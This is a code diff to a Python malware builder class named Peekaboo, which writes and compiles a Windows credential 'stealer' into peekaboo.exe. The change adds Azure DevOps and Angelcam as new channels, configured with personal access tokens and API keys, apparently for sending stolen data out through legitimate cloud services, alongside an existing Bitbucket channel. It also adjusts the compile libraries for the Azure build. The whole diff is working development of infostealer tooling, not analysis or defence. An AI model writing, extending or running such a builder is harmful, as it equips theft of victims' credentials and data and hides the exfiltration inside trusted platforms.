@@ -638,6 +638,14 @@ class Peekaboo:
             subs["BITBUCKET_TOKEN_PLACEHOLDER"]     = cfg.get("bitbucket_token_base64", "")
             subs["BITBUCKET_WORKSPACE_PLACEHOLDER"] = cfg.get("bitbucket_workspace", "")
             subs["BITBUCKET_REPO_PLACEHOLDER"]      = cfg.get("bitbucket_repo", "")
+        elif self.stealer_api == "azure":
+            cfg = self._load_config(cfg_dir / "azure_config.json") or {}
+            subs["AZURE_ORG_PLACEHOLDER"]     = cfg.get("azure_org", "")
+            subs["AZURE_PROJECT_PLACEHOLDER"] = cfg.get("azure_project", "")
+            subs["AZURE_PAT_PLACEHOLDER"]     = cfg.get("azure_pat", "")
+        elif self.stealer_api == "angelcam":
+            cfg = self._load_config(cfg_dir / "angelcam_config.json") or {}
+            subs["ANGELCAM_API_KEY_PLACEHOLDER"] = cfg.get("api_key", "")
         return subs
 
     def build_and_compile_stealer(self) -> Optional[Path]:
@@ -659,8 +667,10 @@ class Peekaboo:
             print(Colors.success(f"wrote stealer source: {stealer_c}"))
 
             stealer_exe = out_dir / "peekaboo.exe"
-            result = self.compile_c(stealer_c, stealer_exe,
-                                    extra_libs=["-lwinhttp", "-liphlpapi"])
+            extra_libs = ["-lwinhttp", "-liphlpapi"]
+            if self.stealer_api == "azure":
+                extra_libs.append("-lcrypt32")
+            result = self.compile_c(stealer_c, stealer_exe, extra_libs=extra_libs)
             return result
         except Exception as e:
             print(Colors.error(f"error building stealer: {e}"))
